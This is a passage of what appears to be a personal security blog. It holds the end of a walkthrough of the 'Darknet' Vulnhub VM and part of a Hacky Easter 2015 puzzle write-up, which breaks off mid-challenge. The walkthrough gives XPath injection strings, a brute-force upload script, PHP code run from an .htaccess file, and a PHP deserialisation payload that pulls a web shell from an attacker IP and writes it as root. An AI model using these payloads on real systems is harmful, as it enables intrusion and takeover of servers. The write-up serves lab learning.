            <span style="color: #66d9ef">break</span>

    <span style="color: #f8f8f2">cmp_pos</span> <span style="color: #f92672">+=</span> <span style="color: #ae81ff">1</span>

<span style="color: #66d9ef">print</span> <span style="color: #e6db74">&#39;Path name:&#39;</span><span style="color: #f8f8f2">,</span> <span style="color: #f8f8f2">name</span>
</pre></div>


<p>So I ran this with the current path</p>

<p><div class="highlight" style="background: #272822"><pre style="line-height: 125%">root@kali:~/darknet# python xpath.py 
u
us
use
user
Path name: user
</pre></div>
</p>

<p>and the parent path</p>

<p><div class="highlight" style="background: #272822"><pre style="line-height: 125%">root@kali:~/darknet# python xpath.py ..
a
au
aut
auth
Path name: auth
</pre></div>
</p>

<p>Ok, that will help me get some more data from the file. I try to see if the
email field will work with <code>1]/email|auth[id=1</code>. I need the <code>auth</code> part because
without it the query will not close correctly in the main script, and this
makes sure the closing <code>]</code> won&rsquo;t error.</p>

<p>So now I should be able to get the username with <code>1]/username|auth[id=1</code>.
Now let&rsquo;s try the password field. I tried <code>pass</code> and <code>password</code> before I realised we&rsquo;re dealing with another
language here. Thanks to the logins I know that the spanish for password is <em>clave</em>.
<code>id=1]/clave|auth[id=1</code> throws up the password! Result. Using these detail
I am able to login at <code>signal8.darknet.com/xpanel</code></p>

<h1 id="stage-4:3817275722f75303351ad52bb23d8c3d">Stage 4</h1>

<p>
<figure >
    
        <img src="http://i.imgur.com/TVG7WhQ.png" />
    
    
</figure>
</p>

<p>Oooh a PHP editor! Sweet&hellip; yeah right. Clicking the link goes to a page that shows:</p>

<p><div class="highlight" style="background: #272822"><pre style="line-height: 125%">Tr0ll Found

The requested URL /xpath/xpanel/edit.php was not found on this server.
</pre></div>
</p>

<p>So after some manual digging nothing comes up. Time to break out <code>dirbuster</code> again
to find <code>ploy.php</code> which presents me with</p>

<p>
<figure >
    
        <img src="http://i.imgur.com/DueLt5z.png" />
    
    
</figure>
</p>

<p>It requires a file which it uploads, as well as a specific combination of checkboxes to be checked.
Just trying some random checkboxes I can determine that the correct number of boxes is 4,
but instead of trying this all manually, I&rsquo;ll script this part.
Looking at the source of the page I see the values for the checkboxes.
All I have to do is iterate of all possible combinations of 4 of these numbers.</p>

<p>Here&rsquo;s my bruteforce script:</p>

<p><div class="highlight" style="background: #272822"><pre style="line-height: 125%"><span style="color: #f92672">import</span> <span style="color: #f8f8f2">sys</span>
<span style="color: #f92672">import</span> <span style="color: #f8f8f2">requests</span>
<span style="color: #f92672">import</span> <span style="color: #f8f8f2">itertools</span>

<span style="color: #f8f8f2">user</span> <span style="color: #f92672">=</span> <span style="color: #e6db74">&#39;devnull&#39;</span>
<span style="color: #f8f8f2">passwd</span> <span style="color: #f92672">=</span> <span style="color: #e6db74">&#39;j4tC1P9aqmY&#39;</span>

<span style="color: #f8f8f2">base_url</span> <span style="color: #f92672">=</span> <span style="color: #e6db74">&#39;http://signal8.darknet.com/xpanel/&#39;</span>

<span style="color: #f8f8f2">login_url</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">base_url</span> <span style="color: #f92672">+</span> <span style="color: #e6db74">&#39;index.php&#39;</span>
<span style="color: #f8f8f2">payload</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">{</span><span style="color: #e6db74">&#39;username&#39;</span><span style="color: #f8f8f2">:</span> <span style="color: #f8f8f2">user,</span> <span style="color: #e6db74">&#39;password&#39;</span><span style="color: #f8f8f2">:</span> <span style="color: #f8f8f2">passwd}</span>

<span style="color: #f8f8f2">sess</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">requests</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">session()</span>

<span style="color: #f8f8f2">r</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">sess</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">post(login_url,</span> <span style="color: #f8f8f2">data</span><span style="color: #f92672">=</span><span style="color: #f8f8f2">payload)</span>

<span style="color: #f8f8f2">ploy_url</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">base_url</span> <span style="color: #f92672">+</span> <span style="color: #e6db74">&#39;ploy.php&#39;</span>

<span style="color: #66d9ef">for</span> <span style="color: #f8f8f2">attempt</span> <span style="color: #f92672">in</span> <span style="color: #f8f8f2">itertools</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">permutations([</span><span style="color: #e6db74">&quot;37&quot;</span><span style="color: #f8f8f2">,</span><span style="color: #e6db74">&quot;58&quot;</span><span style="color: #f8f8f2">,</span><span style="color: #e6db74">&quot;22&quot;</span><span style="color: #f8f8f2">,</span><span style="color: #e6db74">&quot;12&quot;</span><span style="color: #f8f8f2">,</span><span style="color: #e6db74">&quot;72&quot;</span><span style="color: #f8f8f2">,</span><span style="color: #e6db74">&quot;10&quot;</span><span style="color: #f8f8f2">,</span><span style="color: #e6db74">&quot;59&quot;</span><span style="color: #f8f8f2">,</span><span style="color: #e6db74">&quot;17&quot;</span><span style="color: #f8f8f2">,</span><span style="color: #e6db74">&quot;99&quot;</span><span style="color: #f8f8f2">],</span> <span style="color: #ae81ff">4</span><span style="color: #f8f8f2">):</span>
    <span style="color: #f8f8f2">payload</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">{</span><span style="color: #e6db74">&#39;Action&#39;</span><span style="color: #f8f8f2">:</span><span style="color: #e6db74">&#39;Upload&#39;</span><span style="color: #f8f8f2">,</span>
               <span style="color: #e6db74">&#39;checkbox[]&#39;</span><span style="color: #f8f8f2">:</span> <span style="color: #f8f8f2">attempt</span>

              <span style="color: #f8f8f2">}</span>

    <span style="color: #f8f8f2">files</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">{</span><span style="color: #e6db74">&#39;imag&#39;</span><span style="color: #f8f8f2">:(</span><span style="color: #e6db74">&#39;info.txt&#39;</span><span style="color: #f8f8f2">,</span> <span style="color: #f8f8f2">open(</span><span style="color: #e6db74">&#39;info.php&#39;</span><span style="color: #f8f8f2">,</span> <span style="color: #e6db74">&#39;rb&#39;</span><span style="color: #f8f8f2">)}</span>

    <span style="color: #f8f8f2">r</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">sess</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">post(ploy_url,</span> <span style="color: #f8f8f2">data</span><span style="color: #f92672">=</span><span style="color: #f8f8f2">payload,</span> <span style="color: #f8f8f2">files</span><span style="color: #f92672">=</span><span style="color: #f8f8f2">files)</span>

    <span style="color: #66d9ef">if</span> <span style="color: #f8f8f2">r</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">text</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">find(</span><span style="color: #e6db74">&#39;Key incorrecta!&#39;</span><span style="color: #f8f8f2">)</span> <span style="color: #f92672">==</span> <span style="color: #f92672">-</span><span style="color: #ae81ff">1</span><span style="color: #f8f8f2">:</span>
        <span style="color: #66d9ef">print</span> <span style="color: #e6db74">&#39;Found pin: &#39;</span><span style="color: #f8f8f2">,</span> <span style="color: #f8f8f2">attempt</span>
        <span style="color: #f8f8f2">sys</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">exit(</span><span style="color: #ae81ff">0</span><span style="color: #f8f8f2">)</span>
</pre></div>
</p>

<p>The correct PIN is <code>'37', '10', '59', '17'</code>. I tried to upload a PHP script, but
that won&rsquo;t work. Seems uploading anything with a <code>php</code> extension is forbidden.
Casting my mind back I noticed that in the apache config I noticed something interesting.
For this site <code>AllowOverride All</code> is on. Most likely going to be something to
do with <code>.htaccess</code>. To check this I upload the following file, and then browse to a
non-existant file, to generate a 404</p>

<p><div class="highlight" style="background: #272822"><pre style="line-height: 125%">Order deny,allow
Allow from all
ErrorDocument 404 https://google.com
</pre></div>
</p>

<p>This should direct me to <code>google.com</code>, which it does, indicating <code>.htaccess</code> overrides work here.
So what can I do from here that will either allow me to upload a PHP shell or do something else?</p>

<p>Unfortunately there&rsquo;s another issue: as I upload files, old files seem to get deleted.
I found this out when the 404 redirect stopped working after uploading an html file.</p>

<p>Luckily I discovered that it&rsquo;s possible to execute php code inside the .htaccess file.</p>

<p><div class="highlight" style="background: #272822"><pre style="line-height: 125%">AddHandler application/x-httpd-php .htaccess                                    
DirectoryIndex .htaccess                                                        
&lt;FilesMatch &quot;^\.htaccess&quot;&gt;                                                      
Order deny,allow                                                                
Allow from all                                                                  
SetHandler application/x-httpd-php                                              
&lt;/FilesMatch&gt;                                                                   
                                                                                
#&lt;?php print $_GET[&quot;test&quot;]; ?&gt; 
</pre></div>
</p>

<p>Sure enough the <code>$_GET[&quot;test&quot;]</code> variable is on the page. So this should allow me
to get a run some useful code on there somehow.</p>

<p>After following some blind leads, I wrote a php script that would take a file encoded
with base64 and a filename via a <code>POST</code> method and write this file out.
(Note: appending the entire script for DAws or similar didn&rsquo;t work).
Something like this should work though:</p>

<p><div class="highlight" style="background: #272822"><pre style="line-height: 125%">$fp = fopen($_POST[&#39;name&#39;], &#39;wb&#39;); 
fwrite($fp, base64_decode($_POST[&#39;data&#39;])); 
fclose($fp);
</pre></div>
</p>

<p>At the end of the <code>.htaccess</code> file. However this always error with a permissions
error.</p>

<p>After struggling with this for quite some time I got some help from a fellow
#vulnhub resident who helped me out with something I missed. It&rsquo;s <code>suphp</code> not <code>php</code>,
so I wasn&rsquo;t executing the script as the <code>errorlevel</code> user. Derp.</p>

<p>More info on <a href="http://suphp.org/Home.html">suphp</a></p>

<h1 id="stage-5:3817275722f75303351ad52bb23d8c3d">Stage 5</h1>

<p>So having sorted that I uploaded <code>DAws</code> and got myself a reverse shell and explored
once more. Now inside <code>/var/www</code> there&rsquo;s some files I missed earlier: <code>sec.php</code>,
<code>Classes/Test.php</code>, and <code>Classes/Show.php</code>. Interesting.</p>

<p>Trying to hit <code>darknet.com/sec.php</code> errors. Let&rsquo;s take a look inside of it</p>

<p><div class="highlight" style="background: #272822"><pre style="line-height: 125%"><span style="color: #75715e">&lt;?php</span>

<span style="color: #66d9ef">require</span> <span style="color: #e6db74">&quot;Classes/Test.php&quot;</span><span style="color: #f8f8f2">;</span>
<span style="color: #66d9ef">require</span> <span style="color: #e6db74">&quot;Classes/Show.php&quot;</span><span style="color: #f8f8f2">;</span>

<span style="color: #66d9ef">if</span><span style="color: #f8f8f2">(</span><span style="color: #f92672">!</span><span style="color: #66d9ef">empty</span><span style="color: #f8f8f2">($_POST[</span><span style="color: #e6db74">&#39;test&#39;</span><span style="color: #f8f8f2">])){</span>
    <span style="color: #f8f8f2">$d</span><span style="color: #f92672">=</span><span style="color: #f8f8f2">$_POST[</span><span style="color: #e6db74">&#39;test&#39;</span><span style="color: #f8f8f2">];</span>
    <span style="color: #f8f8f2">$j</span><span style="color: #f92672">=</span><span style="color: #f8f8f2">unserialize($d);</span>
    <span style="color: #66d9ef">echo</span> <span style="color: #f8f8f2">$j;</span>
<span style="color: #f8f8f2">}</span>
<span style="color: #75715e">?&gt;</span>
</pre></div>
</p>

<p>Rembering that we&rsquo;re dealing with suphp it could well be that the 500 error is
because <code>sec.php</code> is trying to run as <code>root</code>. Checking <code>/etc/suphp/suphp.conf</code>
my suspicion is correct, the <code>min_uid</code> and <code>min_gid</code> settings are too high for
<code>root</code> scripts to run. But hey, as luck would have it (thanks q3rv0) <code>suphp.conf</code>
is <code>777</code>. So heading straight to <code>sed</code></p>

<p><div class="highlight" style="background: #272822"><pre style="line-height: 125%">$ sed -i <span style="color: #e6db74">&#39;s/min_uid=100/min_uid=0/g&#39;</span> suphp.conf
sed: couldn&#39;t open temporary file ./sedm2LUZQ: Permission denied
</pre></div>
</p>

<p>Hmph. Ok then I&rsquo;ll copy the <code>suphp.conf</code> to <code>/tmp</code> and edit it there, then copy
it back. Making sure I change both <code>min_uid</code> and <code>min_gid</code>, I reload <code>sec.php</code> and
get a blank page. No errors are good errors.</p>

<p>Now that I&rsquo;ve got <code>sec.php</code> running I can go ahead and see what we might be able to exploit.
Anything we do with this file will run as root, some hopefully this is the last part of
Darknet, because I want my life back :)</p>

<p><code>sec.php</code> unserialises our input, which basically takes a serialised string
and <a href="https://php.net/manual/en/function.unserialize.php">unserialises into an object</a>.
Similar to Python&rsquo;s pickle. There&rsquo;s no way I can call a method on either of the classes,
so I have to see what will get called for me.
The <code>Test</code> class has a rather useful destructor, which,
will write data to disk and make it world readable. Almost as if that&rsquo;s what
we&rsquo;re supposed to use.</p>

<p><div class="highlight" style="background: #272822"><pre style="line-height: 125%"><span style="color: #75715e">&lt;?php</span>

<span style="color: #66d9ef">class</span> <span style="color: #a6e22e">Test</span> <span style="color: #f8f8f2">{</span>

    <span style="color: #66d9ef">public</span> <span style="color: #f8f8f2">$url;</span>
    <span style="color: #66d9ef">public</span> <span style="color: #f8f8f2">$name_file;</span>
    <span style="color: #66d9ef">public</span> <span style="color: #f8f8f2">$path;</span>

    <span style="color: #66d9ef">function</span> <span style="color: #a6e22e">__destruct</span><span style="color: #f8f8f2">(){</span>
        <span style="color: #f8f8f2">$data</span><span style="color: #f92672">=</span><span style="color: #f8f8f2">file_get_contents($this</span><span style="color: #f92672">-&gt;</span><span style="color: #a6e22e">url</span><span style="color: #f8f8f2">);</span>
        <span style="color: #f8f8f2">$f</span><span style="color: #f92672">=</span><span style="color: #f8f8f2">fopen($this</span><span style="color: #f92672">-&gt;</span><span style="color: #a6e22e">path</span><span style="color: #f92672">.</span><span style="color: #e6db74">&quot;/&quot;</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">$this</span><span style="color: #f92672">-&gt;</span><span style="color: #a6e22e">name_file</span><span style="color: #f8f8f2">,</span> <span style="color: #e6db74">&quot;w&quot;</span><span style="color: #f8f8f2">);</span>
        <span style="color: #f8f8f2">fwrite($f,</span> <span style="color: #f8f8f2">$data);</span>
        <span style="color: #f8f8f2">fclose($f);</span>
        <span style="color: #f8f8f2">chmod($this</span><span style="color: #f92672">-&gt;</span><span style="color: #a6e22e">path</span><span style="color: #f92672">.</span><span style="color: #e6db74">&quot;/&quot;</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">$this</span><span style="color: #f92672">-&gt;</span><span style="color: #a6e22e">name_file</span><span style="color: #f8f8f2">,</span> <span style="color: #ae81ff">0644</span><span style="color: #f8f8f2">);</span>
<span style="color: #f8f8f2">}</span>
<span style="color: #f8f8f2">}</span>

<span style="color: #75715e">?&gt;</span>
</pre></div>
</p>

<p>The <code>Show</code> class on the other hand is only useful for testing, as this will provide visual
feedback when <code>sec.php</code> gets rendered and runs the <code>echo</code> statement. This will
invoke the <code>__toString</code> method on the <code>Show</code> class. Passing <code>test=O:4:&quot;Show&quot;:1:{s:4:&quot;woot&quot;;s:2:&quot;XX&quot;;}</code>
will print <code>Showme</code>, confirming that the serialisation worked.</p>

<p>Now to get DAws on there as root. First things first I need to determine the serialised
string. I do this with a simple PHP script that searialises the <code>Test</code> class and
prints out the string I need. Which is</p>

<p><div class="highlight" style="background: #272822"><pre style="line-height: 125%">O:4:&quot;Test&quot;:3:{s:3:&quot;url&quot;;s:30:&quot;http://192.168.56.101/DAws.txt&quot;;s:9:&quot;name_file&quot;;s:8:&quot;DAws.php&quot;;s:4:&quot;path&quot;;s:8:&quot;/var/www&quot;}
</pre></div>
</p>

<p>Using Burp suite I use a <code>GET</code> request to <code>sec.php</code>, send it to <code>Repeater</code> and convert
it to a <code>POST</code> request with the required payload:</p>

<p>
<figure >
    
        <img src="http://i.imgur.com/kiutbRt.png" />
    
    
</figure>
</p>

<p>Then I, once again, browse to my DAws url and bind a shell to finally get:</p>

<p><div class="highlight" style="background: #272822"><pre style="line-height: 125%"># whoami <span style="color: #f92672">&amp;&amp;</span> id
root
uid=0(root) gid=0(root) groups=0(root)
# cat flag.txt
      ___           ___           ___           ___           ___           ___           ___     
     /\  \         /\  \         /\  \         /\__\         /\__\         /\  \         /\  \    
    /::\  \       /::\  \       /::\  \       /:/  /        /::|  |       /::\  \        \:\  \   
   /:/\:\  \     /:/\:\  \     /:/\:\  \     /:/__/        /:|:|  |      /:/\:\  \        \:\  \  
  /:/  \:\__\   /::\~\:\  \   /::\~\:\  \   /::\__\____   /:/|:|  |__   /::\~\:\  \       /::\  \ 
 /:/__/ \:|__| /:/\:\ \:\__\ /:/\:\ \:\__\ /:/\:::::\__\ /:/ |:| /\__\ /:/\:\ \:\__\     /:/\:\__\
 \:\  \ /:/  / \/__\:\/:/  / \/_|::\/:/  / \/_|:|~~|~    \/__|:|/:/  / \:\~\:\ \/__/    /:/  \/__/
  \:\  /:/  /       \::/  /     |:|::/  /     |:|  |         |:/:/  /   \:\ \:\__\     /:/  /     
   \:\/:/  /        /:/  /      |:|\/__/      |:|  |         |::/  /     \:\ \/__/     \/__/      
    \::/__/        /:/  /       |:|  |        |:|  |         /:/  /       \:\__\                  
     ~~            \/__/         \|__|         \|__|         \/__/         \/__/                 



     Sabia que podias Campeon!, espero que esta VM haya sido de tu agrado y te hayas divertido
     tratando de llegar hasta aca. Eso es lo que realmente importa!.


#Blog: www.securitysignal.org

#Twitter: @SecSignal, @q3rv0
</pre></div>
</p>

<p>I learned sooooo much through this VM. Many thanks to qu3rv0 for creating it,
Vulnhub for hosting it, and the people who helped me get through it (esp g0blin).</p>

<p>I look forward to the next one.</p>

<h1 id="note:3817275722f75303351ad52bb23d8c3d">Note</h1>

<p>As it was possible to upload a shell with the SQL Admin page, browsing to <code>/var/www</code> would have
taken us directly to the end stage. All the info was there and <code>suphp.conf</code> is world writeable.
Had I done that though I would have missed out on the XPath challenge, which taught me some new tricks,
as well as all the other fun puzzles.</p>

  </div>
  
  <div class="post">
    <h1 class="post-title">
      <a href="http://unlogic.co.uk/2015/06/01/hacky-easter-2015/">
        Hacky Easter 2015
      </a>
    </h1>

    <span class="post-date">Mon, Jun 1, 2015</span>

    

<p>Another year, another Hacky Easter and a month, of fun, learning, and
frustrations. All in all this was another great year and I&rsquo;m already looking
forward to 2016&rsquo;s edition. I found this year&rsquo;s challenges were a bit harder than
last year, but I did my best.</p>

<h1 id="challenge-01:00aa8d5840836b6803fb0a2203b66750">Challenge 01</h1>

<p>I&rsquo;m told to search out the password in the following image</p>


<figure >
    
        <img src="http://i.imgur.com/mIXj50g.jpg" />
    
    
</figure>


<p>Taking note of the missing letters and rearranging them to spell <code>HACKERZ</code> I&rsquo;ll enter
that into the egg-o-matic and see what happens. Oh, hello there&rsquo;e the egg.</p>

<h1 id="challenge-02:00aa8d5840836b6803fb0a2203b66750">Challenge 02</h1>

<p>The eggs is already there:</p>


<figure >
    
        <img src="http://i.imgur.com/98japcd.png" />
    
    
</figure>


<p>But it won&rsquo;t scan in its current state, not with <em>NO</em> written in the QR code.
First things first I looked at the page and image source. Turns out that this is
not an image, but a table instead. I examined the table with Firebug and noticed
that the elements of the <em>NO</em> have different CSS tags. Looking up at the header I
saw that those tags were defined twice, causing the values to be overriden.</p>

<p>I created a local copy, set the values to the initial values (so delete the second
definition) and then we get a valid QR code that will scan.</p>

<h1 id="challenge-03:00aa8d5840836b6803fb0a2203b66750">Challenge 03</h1>

<p>Lego. I love Lego, and therefore already knew what an <code>ldx</code> file is. So I opened
it in Lego Digital Designer and took a look at the bricks. Looks like quite a hard
code to crack. Although it seems a little odd that the bottom layer is 3 bricks deep.
I started picking away some of the first layer and there were white and black bricks
underneath. Potentially a QR code? Even using the &ldquo;Select colour and shape&rdquo; tool, removing
all the top layer bricks will take a little while, but we are then rewarded with a valid QR code.</p>

<h1 id="challenge-04:00aa8d5840836b6803fb0a2203b66750">Challenge 04</h1>

<p>Mobile challenge. I get a list of numbers, or definitions of numbers,
and I have to arrange them in order. The easiest way to do this was to write them in a
file and then use the linux <code>sort</code> command to order them accordingly. Once I had the
list it was just a matter of ordering them in the right order on the phone, and submitting them
to get the egg.</p>

<h1 id="challenge-05:00aa8d5840836b6803fb0a2203b66750">Challenge 05</h1>

<p>Another mobile challange. I get shown four bars, each one of which is controlled
by some phone sensor. The middle two were easy to discover. Just by moving the phone I could
see that the orientation and tilt controlled those. The top bar increased every 5 seconds. The
bottom bar however was a bit trickier. It took a day to discover this, because it actually
represents the time the phone has been charging since the app was run for the first time.</p>

<p>I left it plugged in and waited until the bar was green, aligned the phone correctly and then
waited for the 5 second bar to fill up to collect my egg.</p>

<h1 id="challenge-06:00aa8d5840836b6803fb0a2203b66750">Challenge 06</h1>

<div class="highlight" style="background: #272822"><pre style="line-height: 125%">dah-dah-dit dit dah-dah-dah di-dah-dit dah-dah-dit dit dah-dah dah-di-dah-dit di-di-dah-dit di-dah-di-dit dah-di-dah-dah
</pre></div>


<p>This is clearly morse code. <code>dit</code> and <code>di</code> are dots and the <code>dah</code> is dash. Decoded this to get
<code>georgemcfly</code>. I entered this and was told I was 3 months too early! Only one thing for it:
change the system date to 3 months in the future. Resubmitted the password and was granted the egg.</p>

<h1 id="challenge-07:00aa8d5840836b6803fb0a2203b66750">Challenge 07</h1>

<p>Mobile challange. I need to navigate a Google street view style app to search for the
egg. I was actually surprised how easy it was to find. On the second screen
I looked up and there it was, in the sky. Easy right? Well, once I capped the image, I brought
it into Gimp and manipulated it. Took quite a bit of cleanup and contrast tweaking to get it to scan,
but I got there in the end.</p>

<h1 id="challenge-08:00aa8d5840836b6803fb0a2203b66750">Challenge 08</h1>

<p>So from a spreadsheet ID I have to find this particular spreadsheet? Like any sensible person
I avoid working with spreadsheets as much as I can, so I had to investigate how Google
docs uses these IDs. Luckily once you create a new sheet, you can already identify the ID in the URL.
Replace your ID with the Hacky Easter one and you are given the sheet.</p>

<p>The problem is that the sheet is jumbled up. You need to order the colums and rows in numerical order.
I could have done this in Python, but at the time I got <em>1</em> back for the black boxes. Being
a spreadsheet n00b I didn&rsquo;t know about conditional formating, but you can specify cell formatting based
on content. So that would have been the easy way.</p>

<p>Instead I did it manually. Ordering the rows can be done automatically. Then I just copy
pasted the colums in order and snapped the code. Tedious, but produces results.</p>

<h1 id="challenge-09:00aa8d5840836b6803fb0a2203b66750">Challenge 09</h1>

<p>Mobile challenge. The app&rsquo;s splash screen is egg #9, but distorted. With some
skilled timing I screen capped it and imported it into Pixelmator, where I
used the bulge tool to undistort it enough to be able to scan it.</p>

<p>Alternatively I could have grabbed the image out of the APK I reckon, but
this was simpler at the time.</p>

<h1 id="challenge-10:00aa8d5840836b6803fb0a2203b66750">Challenge 10</h1>

<p>Thumper&rsquo;s got egg 10? Where could he have taken it? Initially I decided
to look in the other challenges and there is one challenge that has a banner
at the bottom. It is an advert for Thumper&rsquo;s info sec training course. Clicking
the banner merely told me that &lsquo;the egg is not in any challenge&rsquo;. They knew we&rsquo;d
come looking.</p>

<p>So where else would people keep eggs? Of course, on the pages where you can see
the eggs each user has. The url for which is <code>http://hackyeaster.hacking-lab.com/hackyeaster/eggs.html?name=hops</code>
so all we do it replace the user <code>hops</code> with <code>Thumper</code> and sure enough, that&rsquo;s
where he&rsquo;s hidden the egg.</p>

<h1 id="challenge-11:00aa8d5840836b6803fb0a2203b66750">Challenge 11</h1>

<p>I was expecting this to be a bit harder, but I just downloaded the files,
opened them up in Thunderbird and found a message with attachments. Downloading
the attachment gives you the egg.</p>

<h1 id="challenge-12:00aa8d5840836b6803fb0a2203b66750">Challenge 12</h1>

<p>A quiz! Simple of course. Well, this is Hacky Easter, so no. The fields are all
incorrectly configured. Look at the source and you can see:</p>

<ul>
<li>Field 1 will change it contents when it loses focus.</li>
<li>Field 2 is a number field but should be a string</li>
<li>Field 3 is a text field but should be a number</li>
<li>Field 4 is a radio button set, but should be checkboxes</li>
<li>Field 5 is a dropdown that is missing the right answer</li>
</ul>

<p>So I worked out the answers, as I still need to get them right, and then I used
Firebug to edit the HTML in place. Once ready I hit <em>Submit</em> only to find I was
wrong. I am sure everything was correct though. I double checked the fields, and
then I noticed that the submit button had <code>value=&quot;false&quot;</code> on it.</p>

<p>Once I edited them all again and set the submit button to <code>true</code> I was granted access
to the egg.</p>

<h1 id="challenge-13:00aa8d5840836b6803fb0a2203b66750">Challenge 13</h1>

<p>This challenge had me going for quite a while. A great example of how you learn
to observe information. Downloading the video I see a 15 minute video that has a
different QR code every second (approx). Each QR code resolves to a egg style
string, so there&rsquo;s no automated way to filter out the right code.</p>

<p>I can&rsquo;t watch it and scan each egg, that would take forever. So I thought about
what I know. Eventually it dawned on me that it&rsquo;s called <em>LEET TV</em>. Leet = 7337.
I wonder if&hellip; scrub the video to 7337 and scan the code. Error message.</p>

<p>But careful, this isn&rsquo;t the same message as you would get if you scan an invalid
egg. I used a different barcode scanner to scan this code and was given a URL. Result!</p>

<p>Visiting the URL I download a wav file, which is clearly a reversed audio recording.</p>

<p>Importing into Audacity, reversing it, and playing it back tells us the timestamp
in the video where the correct QR is shown.</p>

<h1 id="challenge-14:00aa8d5840836b6803fb0a2203b66750">Challenge 14</h1>

<p>On a hunch I just decided to use a 2d barcode scanner to scan the code and see
what happens. Oh, it gives us an egg string. But the app&rsquo;s scanner will only accept
2d codes. Not to worry. Using duckduckgo&rsquo;s qr code creator we can just enter the string
we get from the 1d code, and in return we get a 2d code which we can scan with the
Hacky Easter app.</p>

<h1 id="challenge-15:00aa8d5840836b6803fb0a2203b66750">Challenge 15</h1>

<p>This one was fiendish for me. In the end I actually took apart the APK and
disassembled the code to try and see what this does. From this I could see
that it stores the pics on your SD card. It also runs some analysis on the images,
based on the pixel values. I assumed that it was in fact looking for a picture
of a tomato and a grassy field.</p>

<p>I took a picture of a green screen and managed to get it to return one half of the
code. The tomato was a bit trickier, as a simply red image was not enough. It actually
needed <em>some</em> green in it. Google image search for <em>tomato</em> and took a reasonalbe pic,
which gave me the other half of the code.</p>

<p>After downloading the pics to my desktop, it was just a matter of joining them together
to give me the complete egg.</p>

<p>Was a little bit hit and miss with the pic taking, but nice idea for a challenge.</p>

<h1 id="challenge-16:00aa8d5840836b6803fb0a2203b66750">Challenge 16</h1>

<p><em>Ghosts only come out when it&rsquo;s dark&hellip;</em></p>

<p>This required a few things: a keen eye, and knowledge of crypto.</p>

<p>So firstly we know that we need to make it dark or something. After a while
I finally noticed the light bulb at the bottom right of the main
challenges page. Clicking that makes the page dark and changes the thumbnail for
challenge 16. Now when we click on it we get a set of 4 strings and picture of
a &ldquo;The Ring&rdquo; girl with the word <em>spooky</em> written across it. We are also told:</p>

<p><em>Dark is beautiful. A GOST with chaining appears and has a message for you</em></p>

<p>Nothing is a coincidence, so that&rsquo;s no typo. Searching for <em>GOST</em> I discovered that
it was an encryption method. After quite a bit more searching I discovered that
PHP&rsquo;s mcrypt library supports decrypting this cipher. The cipher requires a
key. On a hunch I decided to use the only other clue available: <em>spooky</em></p>

<p>Now this is where I almost failed. I could decrypt the first code without any
problem. It resulted in the string <code>http://hackyeas</code>. But the second string&rsquo;s
first 8 characters were corrupt. I was so stuck until I discovered that
you had to append all the ciphers together in order to get the plaintext. I guess
that&rsquo;s the <code>chaining</code> part, as well as indicating we should used <code>MCRYPT_MODE_CBC</code>.</p>

<p>This PHP script ended up doing the work for me</p>

<div class="highlight" style="background: #272822"><pre style="line-height: 125%"><span style="color: #75715e">&lt;?php</span>
<span style="color: #f8f8f2">$hash1</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">base64_decode(</span><span style="color: #e6db74">&#39;d5++xytj6RiGwmqEecm63Kow7RZGAAHh&#39;</span><span style="color: #f8f8f2">);</span>
<span style="color: #f8f8f2">$hash2</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">base64_decode(</span><span style="color: #e6db74">&#39;VFsksHFuj/Anap7pWHDZ1XQw8DAApUEN&#39;</span><span style="color: #f8f8f2">);</span>
<span style="color: #f8f8f2">$hash3</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">base64_decode(</span><span style="color: #e6db74">&#39;R5ExOGUKTzGOtvSAlCHkHq6NneL6ZUTX&#39;</span><span style="color: #f8f8f2">);</span>
<span style="color: #f8f8f2">$hash4</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">base64_decode(</span><span style="color: #e6db74">&#39;ej8Taxz+kHK9w9U8dxTOSksZ4HKS2YYD&#39;</span><span style="color: #f8f8f2">);</span>

<span style="color: #f8f8f2">$res</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">mcrypt_decrypt(</span><span style="color: #a6e22e">MCRYPT_GOST</span><span style="color: #f8f8f2">,</span> <span style="color: #e6db74">&#39;spooky&#39;</span><span style="color: #f8f8f2">,</span> <span style="color: #f8f8f2">$hash1</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">$hash2</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">$hash3</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">$hash4,</span> <span style="color: #a6e22e">MCRYPT_MODE_CBC</span><span style="color: #f8f8f2">);</span>
<span style="color: #66d9ef">echo</span> <span style="color: #f8f8f2">base64_encode($res)</span><span style="color: #f92672">.</span><span style="color: #e6db74">&quot;</span><span style="color: #ae81ff">\n</span><span style="color: #e6db74">&quot;</span><span style="color: #f8f8f2">;</span>
</pre></div>


<p>Running it:</p>

<div class="highlight" style="background: #272822"><pre style="line-height: 125%">$&gt; php ./gost.php <span style="color: #f8f8f2">|</span> base64 -d
http://hackyeaster.hacking-lab.com/hackyeaster/images/egg_16_a3eIIACKSy02sJ6LxXeh.png
</pre></div>


<p>No initialisation vector was required, so you can ignore the warning.</p>

<h1 id="challenge-17:00aa8d5840836b6803fb0a2203b66750">Challenge 17</h1>

<p>There&rsquo;s no real way to spot the difference in the images with your eyes. So the
easiest way is to bring them into Gimp on separate layers. Then I adjusted the top
layer&rsquo;s blend mode to &ldquo;difference&rdquo; so that I could see which pixels differ. The image
goes black indicating that there&rsquo;s no differences. Impossible!</p>

<p>Now thinking that there must be differences I figured that they might be so small
that they appear black. I maxed the contrast and brightness to get:</p>


<figure >
    
